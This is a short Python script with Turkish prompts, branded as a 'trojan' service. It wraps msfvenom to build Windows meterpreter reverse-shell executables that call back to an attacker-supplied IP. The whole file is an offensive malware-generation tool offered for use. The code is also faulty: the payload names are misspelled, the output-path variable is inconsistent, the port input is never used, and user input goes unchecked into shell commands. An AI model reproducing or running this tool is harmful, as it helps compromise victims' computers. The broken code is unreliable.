#!/usr/bin/env python
import os
REQUIRED_COMMANDS = ["msfvenom"]
REQUIRED_PY_PACKAGES = []
def trojan():

	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet NUTANTEG TROJAN")
	print("""
	Trojan hizmetine hoş geldiniz!!!

	""")

	ip = input("local ya da dis ip girin: ")
	port = input("port girin: ")
	print("""
	1) Windows/meterpreter/reverce_tcp
	2) Windows/meterpreter/reverce_http
	3) Windows/meterpreter/reverce_https
	""")
	payload = input("Payload no girin: ")
	kayityeri = input("kayıt yeri girin: ")

	if(payload=="1"):
		os.system("msfvenom -p Windows/meterpreter/reverce_tcp LHOST=" + ip + " -f exe -o " + kayıtyeri)
	elif(payload=="2"):
		os.system("msfvenom -p Windows/meterpreter/reverce_http LHOST=" + ip + " -f exe -o " + kayıtyeri)
	elif(payload=="3"):
		os.system("msfvenom -p Windows/meterpreter/reverce_https LHOST=" + ip + " -f exe -o " + kayıtyeri)
	else:
		print("hatalı yazım :( ")
